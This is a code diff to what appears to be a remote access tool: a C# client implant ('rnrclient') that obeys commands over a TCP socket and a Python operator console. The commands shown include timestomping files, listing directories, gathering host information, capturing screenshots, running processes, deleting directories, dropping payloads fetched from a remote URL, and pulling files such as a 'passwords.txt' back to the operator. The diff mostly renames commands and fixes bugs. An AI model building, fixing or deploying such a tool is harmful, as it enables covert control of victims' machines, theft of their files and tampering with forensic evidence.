@@ -1,4 +1,4 @@
-### client
+// client
 
 using System;
 using System.Text;
@@ -83,7 +83,7 @@ namespace rnrclient
             while (true)
             {
                 try
-                { 
+                {
                     NetworkStream stream = client.GetStream();
                     Byte[] data = new Byte[1024];
                     String responseData = String.Empty;
@@ -131,7 +131,7 @@ namespace rnrclient
                     {
                         ts(args[1]);
                     }
-                    else if (args[0] == "enumdir")
+                    else if (args[0] == "list")
                     {
                         if (args.Length != 2)
                         {
@@ -139,7 +139,7 @@ namespace rnrclient
                         }
                         else
                         {
-                            send(enumdir(args[1]));
+                            send(list(args[1]));
                         }
                     }
                     else if (args[0] == "pwd")
@@ -247,7 +247,7 @@ namespace rnrclient
                     }
                 }
 
-                catch(Exception e)
+                catch (Exception e)
                 {
                     send("Error! Double check command!");
                 }
@@ -277,7 +277,13 @@ namespace rnrclient
                 }
                 response.Append("\nProcessor Count: " + System.Environment.ProcessorCount);
                 response.Append("\n64-bit: " + System.Environment.Is64BitOperatingSystem);
-                response.Append("\nLogical Drive: " + Environment.GetLogicalDrives());
+                var logicaldrives = Environment.GetLogicalDrives();
+                string drives = "";
+                foreach (string drive in logicaldrives)
+                {
+                    drives += drive + ", ";
+                }
+                response.Append("\nLogical Drive: " + drives);
                 string Query = "SELECT Capacity FROM Win32_PhysicalMemory";
                 ManagementObjectSearcher searcher = new ManagementObjectSearcher(Query);
                 UInt64 Capacity = 0;
@@ -417,7 +423,7 @@ namespace rnrclient
                 return "Failed to timestomp!";
             }
         }
-        static string enumdir(string path)
+        static string list(string path)
         {
             try
             {
@@ -566,7 +572,7 @@ namespace rnrclient
             }
             catch (Exception e)
             {
-                return "Failed to download file!");
+                return "Failed to download file!";
             }
         }
         static string run(string proc)
@@ -648,6 +654,7 @@ namespace rnrclient
 }
 
 
+
 ### server
 #!/usr/bin/env python
 
@@ -704,13 +711,10 @@ def ssend(conn):
             conn.send(cmd.encode())
             data = b''
             while True:
-                try:
-                    p = conn.recv(4096)
-                    data += p
-                    if len(p) < 4096:
-                        break
-                except:
-                    print("screencap failed!")
+                p = conn.recv(4096)
+                data += p
+                if len(p) < 4096:
+                    break
             dt = str(datetime.datetime.now())
             filename = dt + '.jpg'
             f = open(filename,'wb')
@@ -734,6 +738,7 @@ def ssend(conn):
             f.close()
             print("Operation Complete: file has been saved as " + filename)
         elif(args[0] == 'drop'):
+             conn.send('drop')
              f = open(args[1],'r')
              data = f.read(1024)
              while (data):
@@ -759,46 +764,8 @@ def main():
         accept()
 
 
-
-'''
-			elif(cmd == 'screencap'):
-				client_socket.send(cmd.encode())
-				data = b''
-				while True:
-					p = client_socket.recv(4096)
-					data += p
-					if len(p) < 4096:
-						break
-				dt = str(datetime.datetime.now())
-				filename = dt + '.jpg'
-				f = open(filename,'wb')
-				f.write(data)
-				f.close()
-				print("Operation Complete: screencap has been saved in handler directory as " + filename)
-			elif(args[0] == "getfile"):
-				client_socket.send(cmd.encode())
-				data = b''
-				while True:
-					p = client_socket.recv(4096)
-					data += p
-					if len(p) < 4096:
-						break
-				f = open(args[2],'wb')
-				f.write(data)
-				f.close()
-			else:
-				client_socket.send(cmd.encode())
-				data = b''
-				while True:
-					p = client_socket.recv(4096)
-					data += p
-					if len(p) < 4096:
-						break
-				print((data).decode('utf-8'))
-'''
-
 def menu():
-        print("Command      Description                 Format");
+        print("command      description                 example");
         print("-------      -----------                 ------");
         print("help         display help menu           help, /?, ?");
         print("arch         create zip file from dir    arch <source path> <destination path>, arch C:\\Users\\srcdir C:\\Users\\dest.zip");
@@ -807,7 +774,7 @@ def menu():
         print("deldir       delete directory            deldir <target path>, deldir C:\\Users\\Admin\\Directory");
         print("drop         drop payloads               drop <path> <URI>, dld C:\\Users\\Admin\\AppData\\Local\\Temp\\file.dld https://raw.githubusercontent.com/rnranalysis/file.dld");
         print("envar        get environmental vars      envar");
-        print("enumdir      enumerate files             enumdir <target dir>, enumdir C:\\Users\\Admin\\Desktop");
+        print("list         enumerate files             enumdir <target dir>, enumdir C:\\Users\\Admin\\Desktop");
         print("getfile      grab files                  getfile <target path> <local download path>, getfile C:\\Users\\Admin\\passwords.txt /usr/root/Desktop/passwords.txt");
         print("grep         case sensisitive grep       grep <pattern> <path>, grep foo bar.txt");
         print("hostinfo     get host information        hostinfo");
@@ -843,3 +810,4 @@ def art():
     print("                               $$$$$$/                      ");
 
 main()
+
